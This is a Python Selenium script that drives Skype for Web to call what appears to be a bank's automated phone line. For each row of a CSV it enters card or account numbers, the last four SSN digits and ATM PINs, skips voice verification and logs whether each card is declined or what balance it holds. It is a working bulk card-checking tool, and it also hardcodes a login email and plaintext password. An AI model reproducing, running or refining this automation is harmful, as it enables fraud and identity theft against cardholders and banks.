from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium import webdriver
import traceback
import time
import csv
import os

def get_csv(source_csv):
    lines = []
    chosen_line = None
    target_csv = "history.csv"

    with open(source_csv, 'r', newline='') as src:
        reader = csv.reader(src)
        lines = list(reader)
    
    if lines:
        chosen_line = lines.pop(0)
        
        write_header = not os.path.exists(target_csv)
        with open(target_csv, 'a', newline='') as tgt:
            writer = csv.writer(tgt)
            if write_header:
                writer.writerow(lines[0])
            writer.writerow(chosen_line)
        
        with open(source_csv, 'w', newline='') as src:
            writer = csv.writer(src)
            writer.writerows(lines)
    
    return chosen_line

def is_csv_empty(source_csv):
    with open(source_csv, 'r', newline='') as file:
        reader = csv.reader(file)
        for _ in reader:
            return False
    return True

chrome_user_data_path = r"C:\selenium-profile-fresh"
chrome_options = webdriver.ChromeOptions()
chrome_options.add_argument(f"user-data-dir={chrome_user_data_path}")
chrome_options.add_argument('--use-fake-device-for-media-stream')
chrome_options.add_argument('--use-fake-device-for-media-stream')
chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
chrome_options.add_experimental_option('useAutomationExtension', False)
driver = webdriver.Chrome(options=chrome_options)
def main():
    try:
        # Open Skype for Web
        driver.maximize_window()
        driver.get("https://web.skype.com/")
        print("Opened Skype for Web.")

        # Check if login is required
        try:
            username_field = WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.NAME, "loginfmt"))
            )
            print("Login required. Entering username.")
            username_field.send_keys("akshatgrover02@gmail.com")
            username_field.send_keys(Keys.RETURN)

            # Wait for the password field and enter the password
            password_field = WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.NAME, "passwd"))
            )
            password_field.send_keys("Akshat@@2485")
            password_field.send_keys(Keys.RETURN)
            print("Entered password.")

            # Handle additional prompts
            try:
                prompt_button = WebDriverWait(driver, 10).until(
                    EC.element_to_be_clickable((By.XPATH, "//button[contains(text(), 'Yes')]"))
                )
                prompt_button.click()
                print("Clicked 'Yes' on additional prompt.")
            except Exception as e:
                print("No additional prompt found, continuing...")
        except Exception as e:
            print("Already logged in or another error occurred.")
        try:
            WebDriverWait(driver, 5).until(EC.element_to_be_clickable((By.CSS_SELECTOR, ".css-1dbjc4n.r-1awozwy.r-cl2sl0.r-1dzdj1l.r-1yadl64.r-1777fci.r-1yvhtrz"))).click()
            print("Opened the dialpad.")
        except Exception as e:
            print(f"Failed to click at the specified coordinates: {e}")
            raise
        try:
            wait = WebDriverWait(driver, 5)
            phone_number = "8008693557"
            keypad_input = input_element = wait.until(EC.presence_of_element_located((By.XPATH, '//input[@placeholder="Phone number"]')))
            keypad_input.send_keys(phone_number)
            button = wait.until(EC.element_to_be_clickable((By.XPATH, '//button[@aria-label="Call."]')))
            button.click()

        
            print(f"Entered the phone number {phone_number} and pressed Enter.")
        except Exception as e:
            print(f"Failed to enter the phone number and press Enter: {e}")
            raise
        print("Call placed. Keeping the browser open.")
        search_text = "last four digit"
        parent_div = driver.find_element(By.CLASS_NAME, 'css-1dbjc4n')
        word = "31 seconds"
        invalid_ssn = "number doesn't match"
        banker = "connect you with the banker"
        pin_ask = "ATM pin"
        pin_incorrect = "pin doesn't match"
        verify_voice = "verify without a voice"
        balance = "available balance of"
        written_com = "Written Communications"
        trouble = "having trouble"
        collected_labels = set()
        operations = set()
        driver.implicitly_wait(10)
        try:
            while True:
                child_divs = parent_div.find_elements(By.XPATH, './/div[@aria-label]')
                for div in child_divs:
                    aria_label = div.get_attribute('aria-label')
                    if aria_label not in collected_labels:
                        collected_labels.add(aria_label)
                        if word in aria_label and "acc number" not in operations:
                            wait = WebDriverWait(driver, 5)
                            dialer = wait.until(EC.element_to_be_clickable((By.XPATH, '//button[@aria-label="Enter numbers using the dial pad"]')))
                            dialer.click()
                            put_number = wait.until(EC.presence_of_element_located((By.XPATH, '//input[@type="text" and @size="1"]')))
                            acc_number = card[0]
                            #acc_number = '4342564046876763'
                            put_number.send_keys(acc_number)
                            print("ENTERED ACCOUNT NUMBER")
                            operations.add("acc number")
                        
                        if search_text in aria_label and "ssn number" not in operations:
                            ssn_last4 = card[1]
                            #ssn_last4 = '3627'
                            put_number.send_keys(ssn_last4)
                            print("SENT SSN LAST FOUR DIGITS.")
                            # driver.implicitly_wait(10) # tried this shit and it doesn't work well.  HEREREREREE
                            if banker in aria_label:
                                print(f'CARD DECLINED : {acc_number}')
                                break
                            if invalid_ssn in aria_label:
                                print("INVALID SOCIAL SECURITY NUMBER")
                                break
                            if trouble in aria_label:
                                print(f'CARD DECLINED : {acc_number}')
                            operations.add("ssn number")
                        if written_com in aria_label:
                            break
                        if verify_voice in aria_label and "voice" not in operations: # this too move it
                            put_number.send_keys(1)
                            print("SENT 1 TO BYPASS VOICE VERIFICATION")
                            operations.add("voice") 
                        if pin_ask in aria_label and "pin number" not in operations:
                            pin_num = card[2]
                            put_number.send_keys(pin_num)
                            print("SENT PIN NUMBER")
                            #driver.implicitly_wait(5)
                            # THE PROBLEM IS, TIME.SLEEP DOESN'T WORK AS EXCPECTED EITHER
                            if pin_incorrect in aria_label:
                                print("INCORRECT PIN")
                            elif balance in aria_label:
                                print(aria_label)
                            operations.add("pin number")
                    else:
                        time.sleep(0.1)
        except Exception as e:
            print(f"An error occurred: {e}")

    except Exception as e:
        print(f"An error occurred: {e}")
        traceback.print_exc()

if __name__ == "__main__":
    mycsv = "source.csv" #put name here of current csv
    isempty = is_csv_empty(mycsv)
    while isempty == False:
        card = get_csv(mycsv) 
        print(f"Current card used is {card[0]}\nLast 4 SSN: {card[1]}\nPin code: {card[2]}")
        main()
    exit()
